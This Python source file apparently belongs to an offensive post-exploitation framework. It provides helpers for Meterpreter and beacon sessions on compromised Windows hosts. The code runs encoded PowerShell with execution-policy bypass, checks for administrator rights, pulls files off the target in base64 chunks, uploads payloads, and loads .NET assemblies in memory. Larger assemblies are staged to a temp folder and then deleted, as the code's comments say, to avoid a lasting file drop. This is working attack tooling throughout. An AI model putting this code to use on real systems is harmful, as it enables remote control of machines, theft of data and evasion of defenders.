#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic helpers for Windows shell / Meterpreter post modules."""

from __future__ import annotations

import base64
import os
import re
from typing import Optional

from core.framework.enums import SessionType
from core.framework.failure import FailureType
from core.output_handler import print_error, print_status, print_warning

KS_FILE_MARKER = "__KS_FILE__:"

_PS_PROBE_COMMANDS = (
    'powershell -NoP -NonI -Command "Write-Output PS_OK"',
    'powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
    r'%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
)


def win_compat_failure_type():
    """FailureType for target mismatch — works before/after NotCompatible was added."""
    return getattr(FailureType, "NotCompatible", None) or FailureType.NoTarget


def win_probe_powershell(execute_fn) -> bool:
    """Robust PowerShell presence check (avoids fragile ``Write-Output 1`` framing misses).

    ``execute_fn`` must accept a command string and return stdout text.
    """
    if not callable(execute_fn):
        return False
    for cmd in _PS_PROBE_COMMANDS:
        try:
            out = execute_fn(cmd) or ""
        except Exception:
            continue
        if "PS_OK" in out:
            return True
    return False


class WindowsSessionMixin:
    """Mixin for Post modules — expects cmd_execute, session_id, framework."""

    # CreateProcess cmdline ceiling (~8191); leave headroom for cmd.exe /c wrappers
    _WIN_CMDLINE_SAFE = 7000

    def _win_sid(self) -> str:
        sid = getattr(self, "session_id", "")
        if hasattr(sid, "value"):
            sid = sid.value
        return str(sid or "").strip()

    def _win_meterpreter(self) -> bool:
        sid = self._win_sid()
        if not sid or not getattr(self, "framework", None):
            return False
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            return False
        session = sm.get_session(sid)
        if not session:
            return False
        st = (getattr(session, "session_type", "") or "").lower()
        return st == SessionType.METERPRETER.value.lower()

    def _win_polling(self) -> bool:
        """True for HTTP-polling / beacon sessions (Zig Kitty, etc.)."""
        sid = self._win_sid()
        if not sid or not getattr(self, "framework", None):
            return False
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            return False
        session = sm.get_session(sid)
        if not session:
            return False
        st = str(getattr(session, "session_type", "") or "").lower()
        data = getattr(session, "data", None) or {}
        if not isinstance(data, dict):
            data = {}
        module = str(data.get("listener_module") or data.get("module") or "").lower()
        return (
            st == "polling"
            or "polling" in st
            or "http_polling" in module
            or "beacon" in st
        )

    def _win_polling_shell(self):
        """Return active PollingShell with typed tasks, or None."""
        sid = self._win_sid()
        fw = getattr(self, "framework", None)
        if not sid or not fw or not getattr(fw, "shell_manager", None):
            return None
        sm = fw.shell_manager
        shell = sm.get_shell(sid)
        if not shell:
            sm.execute_command(sid, "echo.", framework=fw)
            shell = sm.get_shell(sid)
        if shell and hasattr(shell, "_queue_task"):
            return shell
        return None

    def win_execute(self, command: str, timeout: int = 15, *, wrap_job: bool = True) -> str:
        if not command:
            return ""
        if self._win_meterpreter() and not command.lstrip().lower().startswith("shell "):
            command = f"shell {command}"
        if wrap_job and timeout > 0 and not command.lstrip().lower().startswith("powershell -encodedcommand"):
            # Job wrapper is for interactive shells; skip on polling (adds cmdline bloat / fragility)
            if not self._win_polling():
                command = (
                    f'powershell -Command "$job = Start-Job -ScriptBlock {{ {command} }}; '
                    f'if (Wait-Job $job -Timeout {timeout}) {{ Receive-Job $job }} '
                    f'else {{ Stop-Job $job; Remove-Job $job; Write-Output \\"TIMEOUT\\" }}"'
                )
        try:
            output = (self.cmd_execute(command) or "").strip()
            if "TIMEOUT" in output:
                print_warning(f"Command timed out after {timeout}s")
                return ""
            return self.win_strip_clixml(output)
        except Exception as exc:
            print_warning(f"Command failed: {exc}")
            return ""

    @staticmethod
    def win_strip_clixml(text: str) -> str:
        """Drop PowerShell CLIXML stderr blobs; keep prior stdout or decoded errors."""
        if not text:
            return ""
        markers = ("#< CLIXML", "<Objs Version=")
        cut = -1
        for marker in markers:
            idx = text.find(marker)
            if idx >= 0 and (cut < 0 or idx < cut):
                cut = idx
        if cut < 0:
            return text
        head = text[:cut].rstrip()
        if head:
            return head
        msgs = re.findall(r'<S S="Error">([^<]*)</S>', text[cut:])
        if not msgs:
            return ""
        decoded = []
        for raw in msgs:
            s = raw.replace("_x000D_", "\r").replace("_x000A_", "\n")
            s = re.sub(
                r"_x([0-9A-Fa-f]{4})_",
                lambda m: chr(int(m.group(1), 16)),
                s,
            )
            s = s.strip()
            if s:
                decoded.append(s)
        return "\n".join(decoded)

    @staticmethod
    def win_encode_powershell(script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def win_run_powershell(self, script: str, *, timeout: int = 30) -> str:
        """Run a PowerShell script. Oversized EncodedCommand → upload .ps1 then -File.

        Classic sessions keep the single EncodedCommand path when it fits.
        """
        script = (script or "").strip()
        if not script:
            return ""
        encoded = self.win_encode_powershell(script)
        cmdline = (
            f"powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand {encoded}"
        )
        if len(cmdline) <= self._WIN_CMDLINE_SAFE:
            return self.win_execute(cmdline, timeout=timeout, wrap_job=False)

        # Generic large-script path (classic + polling): stage file then -File
        temp = self.win_remote_temp_dir()
        import uuid

        remote = f"{temp}\\ks_ps_{uuid.uuid4().hex[:10]}.ps1"
        if not self.win_write_remote_bytes(script.encode("utf-8"), remote):
            print_error("Failed to stage PowerShell script on target")
            return ""
        try:
            return self.win_execute(
                f'powershell -NoP -NonI -ExecutionPolicy Bypass -File "{remote}"',
                timeout=timeout,
                wrap_job=False,
            )
        finally:
            self.win_delete_remote([remote])

    @staticmethod
    def win_ps_single_quote(value: str) -> str:
        return str(value).replace("'", "''")

    def win_remote_temp_dir(self, option_name: str = "out_dir") -> str:
        opt = getattr(self, option_name, None)
        val = opt.value if hasattr(opt, "value") else opt
        if str(val or "").strip():
            return str(val).strip().rstrip("\\")
        output = self.win_execute("echo %TEMP%", timeout=5)
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def win_is_windows(self) -> bool:
        """Best-effort Windows detection (session metadata + probes).

        Avoids ``echo %OS%`` inside the default PowerShell job wrapper — ``%OS%``
        is a cmd.exe expansion and never becomes ``Windows_NT`` under PowerShell.
        """
        sid = self._win_sid()
        fw = getattr(self, "framework", None)
        if sid and fw and hasattr(fw, "session_manager"):
            session = fw.session_manager.get_session(sid)
            if session:
                data = getattr(session, "data", None) or {}
                if isinstance(data, dict):
                    plat = str(data.get("platform") or "").lower()
                    if "win" in plat:
                        return True
                sm = getattr(fw, "shell_manager", None)
                if sm:
                    shell = sm.get_shell(sid)
                    if shell and getattr(shell, "is_windows", False):
                        return True
                    if shell and getattr(shell, "platform_detected", False):
                        # ClassicShell sets is_windows after probe; trust it either way
                        return bool(getattr(shell, "is_windows", False))

        # Always wrap_job=False. Prefer cmd /c so powershell_mode EncodedCommand wrapping
        # still expands %OS% correctly.
        probes = (
            'cmd /c "echo %OS%"',
            'powershell -NoP -NonI -Command "Write-Output $env:OS"',
            "ver",
        )
        for cmd in probes:
            out = self.win_execute(cmd, timeout=5, wrap_job=False) or ""
            if "Windows_NT" in out:
                return True
            if re.search(r"Microsoft Windows|Windows\s+\[Version", out, re.I):
                return True
        return False

    def win_require_windows(self) -> bool:
        if not self._win_sid():
            print_error("Session ID is required.")
            return False
        if not self.win_is_windows():
            print_error("Windows session required.")
            return False
        return True

    def win_is_admin(self) -> bool:
        if "OK" in self.win_execute("net session >nul 2>&1 && echo OK || echo NO", timeout=5):
            return True
        ps = (
            'powershell -Command "$p = New-Object Security.Principal.WindowsPrincipal('
            "[Security.Principal.WindowsIdentity]::GetCurrent()); "
            'if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) '
            '{ Write-Output \\"ADMIN\\" } else { Write-Output \\"USER\\" }"'
        )
        return "ADMIN" in self.win_execute(ps, timeout=8)

    def win_powershell_available(self) -> bool:
        """Silent check — True if PowerShell responds with the probe marker."""
        return win_probe_powershell(
            lambda cmd: self.win_execute(cmd, timeout=8, wrap_job=False)
        )

    def win_require_powershell(self) -> bool:
        if not self.win_powershell_available():
            print_error("PowerShell is not available on the target.")
            return False
        return True

    @staticmethod
    def win_compat_failure():
        return win_compat_failure_type()

    @staticmethod
    def win_parse_file_marker(output: str, marker: str = KS_FILE_MARKER) -> str:
        for line in (output or "").splitlines():
            line = line.strip()
            if line.startswith(marker):
                return line[len(marker):].strip()
        return ""

    def win_remote_file_size(self, path: str) -> int:
        pq = self.win_ps_single_quote(path)
        out = self.win_run_powershell(f"(Get-Item -LiteralPath '{pq}').Length", timeout=10).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def win_read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self.win_ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self.win_run_powershell(ps, timeout=30)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def win_pull_file_via_session(
        self,
        remote_path: str,
        local_path: str,
        *,
        chunk_kb: int = 512,
    ) -> bool:
        size = self.win_remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote file is missing or empty: {remote_path}")
            return False

        print_status(f"Downloading {size} bytes...")
        chunk = max(1024, int(chunk_kb) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self.win_read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset}.")
                return False
            parts.append(blob)
            offset += n
            if size > chunk:
                pct = int((offset * 100) / size)
                print_status(f"Download progress: {pct}%")

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as handle:
            handle.write(b"".join(parts))
        return True

    def win_run_dotnet_assembly(
        self,
        assembly_path: str,
        *,
        type_name: str = "",
        method_name: str = "Main",
        arguments: str = "",
        timeout: int = 60,
    ) -> str:
        pq = self.win_ps_single_quote(assembly_path)
        tn = self.win_ps_single_quote(type_name) if type_name else ""
        mn = self.win_ps_single_quote(method_name)
        args_ps = self.win_ps_single_quote(arguments)
        resolve_type = (
            f"$type = $asm.GetType('{tn}')"
            if tn
            else (
                "$type = $asm.GetTypes() | Where-Object { "
                "$_.GetMethod('Main', [typeof(string[])]) -or $_.GetMethod('Main') "
                "} | Select-Object -First 1"
            )
        )
        script = f"""
$ErrorActionPreference = 'Stop'
$path = '{pq}'
$bytes = [IO.File]::ReadAllBytes($path)
$asm = [Reflection.Assembly]::Load($bytes)
{resolve_type}
if (-not $type) {{ throw 'Type not found' }}
$main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static,InvokeMethod')
if (-not $main) {{ $main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static') }}
if (-not $main) {{ throw 'Method not found' }}
$argLine = '{args_ps}'
$params = $main.GetParameters()
if ($params.Count -eq 0) {{
  $main.Invoke($null, $null) | Out-String -Width 4096
}} elseif ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {{
  $args = if ($argLine) {{ ,@($argLine -split ' ') }} else {{ ,@([string[]]@()) }}
  $main.Invoke($null, $args) | Out-String -Width 4096
}} else {{
  throw 'Unsupported Main signature'
}}
"""
        return self.win_run_powershell(script, timeout=timeout)

    def win_run_dotnet_assembly_bytes(
        self,
        assembly_bytes: bytes,
        *,
        type_name: str = "",
        method_name: str = "Main",
        arguments: str = "",
        timeout: int = 120,
        embed_max_bytes: int = 4500,
    ) -> str:
        """Load a .NET assembly from operator-side bytes (in-memory loadmodule).

        Small assemblies are embedded in a single PowerShell EncodedCommand.
        Larger ones are staged to %TEMP%, loaded with Assembly.Load, then deleted
        in the same script (no lasting PE drop).
        """
        if not assembly_bytes:
            raise ValueError("assembly_bytes is empty")

        from lib.post.windows.assembly_loader import build_invoke_from_bytes_script

        script = build_invoke_from_bytes_script(
            assembly_bytes,
            type_name=type_name,
            method_name=method_name,
            arguments=arguments,
            embed_max_bytes=embed_max_bytes,
        )
        if script is not None:
            return self.win_run_powershell(script, timeout=timeout)

        # Stage + load + delete in one remote flow
        import uuid

        temp_out = self.win_execute("echo %TEMP%", timeout=5, wrap_job=False).strip().splitlines()
        temp_dir = (temp_out[-1] if temp_out else "").strip() or r"C:\Windows\Temp"
        remote_full = f"{temp_dir.rstrip('\\')}\\ks_asm_{uuid.uuid4().hex[:12]}.bin"
        if not self.win_write_remote_bytes(assembly_bytes, remote_full):
            raise RuntimeError(f"Failed to stage assembly to {remote_full}")
        try:
            out = self.win_run_dotnet_assembly(
                remote_full,
                type_name=type_name,
                method_name=method_name,
                arguments=arguments,
                timeout=timeout,
            )
        finally:
            self.win_delete_remote([remote_full])
        return out

    def win_write_remote_b64_text(
        self,
        b64_payload: str,
        remote_path: str,
        *,
        chunk_size: int = 1200,
    ) -> None:
        """Write a base64 text blob to a remote path in append-safe chunks.

        ``chunk_size`` stays small so EncodedCommand fits CreateProcess limits
        when the session wraps commands in ``cmd.exe /c``.
        """
        path_q = self.win_ps_single_quote(remote_path)
        chunks = [b64_payload[i:i + chunk_size] for i in range(0, len(b64_payload), chunk_size)]
        for index, chunk in enumerate(chunks):
            chunk_q = self.win_ps_single_quote(chunk)
            method = "WriteAllText" if index == 0 else "AppendAllText"
            self.win_run_powershell(
                f"[IO.File]::{method}('{path_q}','{chunk_q}');",
                timeout=15,
            )

    def win_write_remote_script(
        self,
        content: str,
        remote_dir: str,
        base_name: str,
        *,
        encoding: str = "utf-8",
        extension: str = ".ps1",
    ) -> tuple[str, str]:
        """Upload a script to the target (typed upload on polling; else b64 staging)."""
        script_path = f"{remote_dir.rstrip('\\')}\\{base_name}{extension}"
        data = content.encode(encoding)
        if self.win_write_remote_bytes(data, script_path):
            return script_path, ""
        # Fallback: stage via base64 text file (classic shells)
        blob_path = f"{remote_dir.rstrip('\\')}\\{base_name}.b64"
        payload = base64.b64encode(data).decode("ascii")
        self.win_write_remote_b64_text(payload, blob_path)
        blob_q = self.win_ps_single_quote(blob_path)
        script_q = self.win_ps_single_quote(script_path)
        self.win_run_powershell(
            f"$b=[IO.File]::ReadAllText('{blob_q}');"
            f"[IO.File]::WriteAllText('{script_q}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));",
            timeout=20,
        )
        return script_path, blob_path

    def win_write_remote_bytes(
        self,
        data: bytes,
        remote_path: str,
        *,
        chunk_kb: int = 256,
    ) -> bool:
        """Upload raw bytes to a remote file through the session."""
        if not data:
            print_error("Cannot upload empty payload.")
            return False

        # Polling / typed-agent path: one upload task (no cmdline length issues)
        if self._win_polling():
            shell = self._win_polling_shell()
            if shell:
                b64 = base64.b64encode(data).decode("ascii")
                result = shell._queue_task(
                    "upload",
                    {"path": remote_path, "data": b64, "encoding": "base64"},
                    wait=True,
                ) or {}
                text = str(result.get("output") or result.get("error") or "")
                if re.search(r"ok wrote|uploaded|\d+\s*bytes", text, re.I):
                    return True
                if self.win_remote_file_exists(remote_path):
                    return True
                print_warning(f"Typed upload failed ({text[:120] or 'empty'}); falling back")

        path_q = self.win_ps_single_quote(remote_path)
        chunk = max(1024, int(chunk_kb) * 1024)
        # Keep each EncodedCommand under cmdline limit (base64 expands ~4/3)
        max_raw = 900
        chunk = min(chunk, max_raw)
        offset = 0
        size = len(data)
        while offset < size:
            piece = data[offset:offset + chunk]
            b64 = base64.b64encode(piece).decode("ascii")
            b64_q = self.win_ps_single_quote(b64)
            mode = "Create" if offset == 0 else "Append"
            self.win_run_powershell(
                f"$b=[Convert]::FromBase64String('{b64_q}');"
                f"$fs=[IO.File]::Open('{path_q}',[IO.FileMode]::{mode});"
                f"$fs.Write($b,0,$b.Length);$fs.Close();",
                timeout=30,
            )
            offset += len(piece)
            if size > chunk:
                pct = int((offset * 100) / size)
                print_status(f"Upload progress: {pct}%")

        return self.win_remote_file_size(remote_path) == size

    def win_upload_file(
        self,
        local_path: str,
        remote_path: str,
        *,
        chunk_kb: int = 256,
    ) -> bool:
        """Upload a local file to the target through the session."""
        if not os.path.isfile(local_path):
            print_error(f"Local file not found: {local_path}")
            return False
        with open(local_path, "rb") as handle:
            data = handle.read()
        print_status(f"Uploading {len(data)} bytes to {remote_path}...")
        return self.win_write_remote_bytes(data, remote_path, chunk_kb=chunk_kb)

    def win_read_remote_text(self, remote_path: str, *, timeout: int = 30) -> str:
        # Prefer typed cat on polling agents (avoids fragile cmd type quoting)
        if self._win_polling():
            shell = self._win_polling_shell()
            if shell:
                result = shell._queue_task("cat", {"path": remote_path}, wait=True) or {}
                text = str(result.get("output") or "")
                err = str(result.get("error") or "")
                if text and not text.startswith("ERROR:"):
                    return text
                if err and not text:
                    print_warning(f"Typed cat failed: {err[:160]}")
        return self.win_execute(f'type "{remote_path}"', timeout=timeout, wrap_job=False)

    def win_remote_file_exists(self, remote_path: str) -> bool:
        pq = self.win_ps_single_quote(remote_path)
        out = self.win_run_powershell(
            f"if (Test-Path -LiteralPath '{pq}') {{ 'OK' }} else {{ 'MISSING' }}",
            timeout=8,
        )
        if "OK" in out or "MISSING" in out:
            return "OK" in out
        out = self.win_execute(
            f'if exist "{remote_path}" (echo OK) else (echo MISSING)',
            timeout=8,
            wrap_job=False,
        )
        return "OK" in out

    def win_run_remote_executable(
        self,
        remote_path: str,
        arguments: str = "",
        *,
        timeout: int = 60,
    ) -> str:
        cmd = f'"{remote_path}"'
        args = str(arguments or "").strip()
        if args:
            cmd = f"{cmd} {args}"
        return self.win_execute(cmd, timeout=timeout)

    def win_delete_remote(self, paths) -> None:
        cleaned = [p for p in (paths or []) if p]
        if not cleaned:
            return
        stmts = ";".join(
            f"Remove-Item -LiteralPath '{self.win_ps_single_quote(p)}' "
            f"-Force -ErrorAction SilentlyContinue"
            for p in cleaned
        )
        out = self.win_run_powershell(stmts, timeout=15)
        if out and re.search(r"(cannot find|not recognized|exception)", out, re.I):
            for path in cleaned:
                self.win_execute(f'del /f /q "{path}"', timeout=8, wrap_job=False)

    @staticmethod
    def win_powershell_cli_prefix(*, no_profile: bool = True, non_interactive: bool = True) -> str:
        parts = ["powershell"]
        if no_profile:
            parts.append("-NoProfile")
        if non_interactive:
            parts.append("-NonInteractive")
        parts.extend(["-ExecutionPolicy", "Bypass"])
        return " ".join(parts)

    @staticmethod
    def win_int_opt(val, default: int, minimum: Optional[int] = None) -> int:
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n
